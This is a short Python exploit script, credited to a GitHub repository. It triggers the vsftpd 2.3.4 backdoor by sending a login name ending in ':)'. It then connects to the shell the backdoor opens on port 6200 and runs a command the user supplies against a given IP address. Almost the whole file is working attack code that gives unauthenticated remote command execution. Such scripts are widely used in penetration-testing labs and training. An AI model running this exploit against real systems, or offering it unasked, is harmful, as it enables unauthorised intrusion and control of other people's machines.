#!/usr/bin/python3
import socket
import sys
import time

"""
File from In2econd
https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py
"""

def exploit(ip, port, command):
    """ Triggers vsftpd 2.3.4 backdoor and prints supplied command's output """

    try:
        print('[*] Attempting to trigger backdoor...')
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.connect((ip, port))

        # Attempt to login to trigger backdoor
        ftp_socket.send(b'USER letmein:)\n')
        ftp_socket.send(b'PASS please\n')
        time.sleep(2)
        ftp_socket.close()
        print('[+] Triggered backdoor')

    except Exception:
        print('[!] Failed to trigger backdoor on %s' % ip)

    try:
        print('[*] Attempting to connect to backdoor...')
        backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_socket.connect((ip, 6200))
        print('[+] Connected to backdoor on %s:6200' % ip)
        command = str.encode(command + '\n')
        backdoor_socket.send(command)
        response = backdoor_socket.recv(1024).decode('utf-8')
        print('[+] Response:\n', response, sep='')
        backdoor_socket.close()

    except Exception:
        print('[!] Failed to connect to backdoor on %s:6200' % ip)


if __name__ == '__main__':

    if len(sys.argv) < 4:
        print('Usage: ./vsftpd_234_exploit.py <IP address> <port> <command>')
        print('Example: ./vsftpd_234_exploit.py 192.168.1.10 21 whoami')

    else:
        exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3])